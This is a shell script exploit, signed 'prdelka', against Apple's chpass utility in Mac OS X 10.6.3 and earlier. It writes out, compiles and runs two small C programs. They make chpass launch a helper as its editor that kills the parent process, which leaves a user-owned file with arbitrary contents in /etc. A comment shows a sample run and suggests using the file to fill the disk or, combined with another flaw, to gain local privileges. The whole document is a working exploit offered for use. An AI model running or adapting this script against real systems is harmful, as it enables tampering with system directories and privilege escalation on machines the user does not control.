#!/bin/sh
# Apple <= 10.6.3 'chpass' BSD insecure temp file creation in /etc vuln
# =====================================================================
# A user can create a file with rw perms in /etc as owner and populate 
# it with arbitrary data. This could be utilized to fill the disk or
# write configuration file information that could be combined with 
# another flaw to elevate local privileges. This shell script takes
# an arguement which is the filename to create (appended with .XXXXXX)
# or I.HAX by default.
# 
# e.g
#
#  fantastics-macbook:~ fantastic$ id
#  uid=501(fantastic) gid=20(staff) groups=20(staff)
#  fantastics-macbook:~ fantastic$ ls -l /etc
#  lrwxr-xr-x@ 1 root  wheel  11 10 Feb 18:42 /etc -> private/etc
#  fantastics-macbook:~ fantastic$ ./prdelka-vs-APPLE-chpass.sh 
#  [ Apple <= 10.6.3 'chpass' arbitrary /etc file creation exploit
#  Password for fantastic: fuck.apple 
#  [ Created evil file /etc/I.HAX.9GrrKm
#  [ Killing my parent PID 1472
#  ./prdelka-vs-APPLE-chpass.sh: line 47:  1472 Killed ./exploit I.HAX
#  fantastics-macbook:~ fantastic$ ls -al /etc/I.HAX.9GrrKm 
#  -rw-------  1 fantastic  staff  203 17 May 21:15 /etc/I.HAX.9GrrKm
#  fantastics-macbook:~ fantastic$ echo "Turtle power" > /etc/I.HAX.9GrrKm 
#  fantastics-macbook:~ fantastic$ cat /etc/I.HAX.9GrrKm 
#  Turtle power 
#
# -- prdelka
cat >> evil.c << EOF
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>

int main(int argc,char* argv[]){
	printf("[ Created evil file %s\n",argv[1]);
	pid_t parent = getppid();
	printf("[ Killing my parent PID %d\n",parent);
	usleep(1000);
	kill(parent,9);
	exit(0);
}
EOF
gcc evil.c -o evil 2>/dev/null
rm -rf evil.c
cat >> exploit.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc,char* argv[]){
        char* envp[]={"EDITOR=./evil",NULL};
        char* args[]={argv[1],NULL};
	printf("[ Apple <= 10.6.3 'chpass' arbitrary /etc file creation exploit\n");
        execve("/usr/bin/chpass",args,envp);
}
EOF
gcc exploit.c -o exploit 2>/dev/null
rm -rf exploit.c
if [ $1 ]
then
        ./exploit $1
else
        ./exploit I.HAX
fi
rm -rf evil exploit

